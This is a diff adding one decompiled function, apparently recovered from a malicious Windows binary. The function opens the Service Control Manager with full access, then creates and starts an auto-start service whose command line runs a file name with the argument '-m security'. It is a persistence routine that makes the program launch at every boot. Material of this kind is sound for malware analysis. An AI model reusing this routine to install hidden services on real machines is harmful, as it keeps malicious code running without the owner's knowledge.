@@ -1,0 +1,23 @@
+int sub_407C40()
+{
+  SC_HANDLE v0; // eax
+  SC_HANDLE v1; // edi
+  SC_HANDLE ServiceA; // eax
+  SC_HANDLE v3; // esi
+  char Buffer[260]; // [esp+4h] [ebp-104h] BYREF
+
+  sprintf(Buffer, "%s -m security", FileName);
+  v0 = OpenSCManagerA(0, 0, 0xF003Fu);
+  v1 = v0;
+  if ( !v0 )
+    return 0;
+  ServiceA = CreateServiceA(v0, ServiceName, DisplayName, 0xF01FFu, 0x10u, 2u, 1u, Buffer, 0, 0, 0, 0, 0);
+  v3 = ServiceA;
+  if ( ServiceA )
+  {
+    StartServiceA(ServiceA, 0, 0);
+    CloseServiceHandle(v3);
+  }
+  CloseServiceHandle(v1);
+  return 0;
+}
